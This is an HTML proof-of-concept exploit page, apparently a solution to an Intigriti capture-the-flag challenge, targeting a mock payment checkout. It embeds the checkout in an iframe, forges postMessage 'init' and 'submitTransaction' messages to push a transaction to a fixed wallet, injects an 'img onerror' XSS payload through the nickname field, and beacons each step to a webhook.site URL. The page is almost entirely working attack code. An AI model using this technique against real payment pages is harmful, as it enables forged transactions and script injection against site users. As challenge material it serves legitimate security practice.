<!DOCTYPE html>
<html>
<head><title>Gateway Source</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
<h2>EXPLOIT: PAYMENT GATEWAY SOURCE</h2>
<pre id=log></pre>
<iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:400px;border:2px solid #0f0"></iframe>
<script>
const WEBHOOK = 'https://webhook.site/88e06649-c9b5-47cf-8913-b4af386d563d';
const WALLET = '16472226db03703a192aa383237035a69f';
const log = document.getElementById('log');

function msg(s) { 
    log.textContent += '\n' + s; 
    fetch(WEBHOOK + '?s=' + s).catch(()=>{}); 
}
msg('1_START');

document.getElementById('checkout').onload = function() {
    msg('2_CHECKOUT_LOADED');
    
    // Send init message first (like real payment gateway)
    setTimeout(function() {
        msg('3_SENDING_INIT');
        
        document.getElementById('checkout').contentWindow.postMessage({
            type: 'init',
            currency: '1337COIN',
            amount: 1,
            price: 1
        }, '*');
        
        msg('4_INIT_SENT');
        
        // Then send transaction after delay
        setTimeout(function() {
            msg('5_SENDING_TRANSACTION');
            
            document.getElementById('checkout').contentWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: WALLET,
                    currency: '1337COIN',
                    amount: 1,
                    nickname: '<img src=x onerror="alert(\'gigawatz\')">'
                }
            }, '*');
            
            msg('6_TRANSACTION_SENT');
            
            setTimeout(function() {
                msg('7_REDIRECTING');
                window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
            }, 3000);
        }, 3000);
    }, 2000);
};
</script>
</body>
</html>
